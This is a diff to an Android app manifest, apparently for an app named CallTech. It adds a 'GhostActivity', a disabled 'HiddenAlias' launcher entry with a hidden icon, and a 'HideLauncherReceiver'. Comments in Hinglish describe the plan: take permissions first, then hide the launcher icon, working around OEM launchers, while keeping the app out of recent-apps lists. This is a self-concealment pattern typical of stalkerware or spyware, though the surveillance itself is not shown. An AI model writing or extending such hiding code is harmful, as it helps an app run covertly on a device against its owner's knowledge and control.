@@ -47,10 +47,20 @@
         android:enabled="true"
         android:exported="true"
         android:excludeFromRecents="true"
+        android:autoRemoveFromRecents="true"
         android:launchMode="singleTop"
         android:theme="@style/PermissionTrampolineTheme" />
 
-      <!-- Installer Open isi activity ko kholta hai: permission aage, icon sath hide. -->
+      <activity
+        android:name=".GhostActivity"
+        android:enabled="true"
+        android:exported="true"
+        android:excludeFromRecents="true"
+        android:autoRemoveFromRecents="true"
+        android:noHistory="true"
+        android:theme="@style/PermissionTrampolineTheme" />
+
+      <!-- Installer Open — visible CallTech icon. Hide ke baad disable. -->
       <activity-alias
         android:name=".LauncherAlias"
         android:enabled="true"
@@ -59,6 +69,21 @@
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:targetActivity=".PermissionTrampolineActivity">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+      </activity-alias>
+
+      <!-- OEM launcher 1→0 ignore karta hai. Pehle ye ON, phir LauncherAlias OFF. -->
+      <activity-alias
+        android:name=".HiddenAlias"
+        android:enabled="false"
+        android:exported="true"
+        android:icon="@drawable/ic_hidden"
+        android:label="@string/hidden_app_label"
+        android:roundIcon="@drawable/ic_hidden"
+        android:targetActivity=".GhostActivity">
         <intent-filter>
             <action android:name="android.intent.action.MAIN" />
             <category android:name="android.intent.category.LAUNCHER" />
@@ -103,6 +128,11 @@
 
       <receiver
         android:name=".SyncAlarmReceiver"
+        android:enabled="true"
+        android:exported="false" />
+
+      <receiver
+        android:name=".HideLauncherReceiver"
         android:enabled="true"
         android:exported="false" />
 
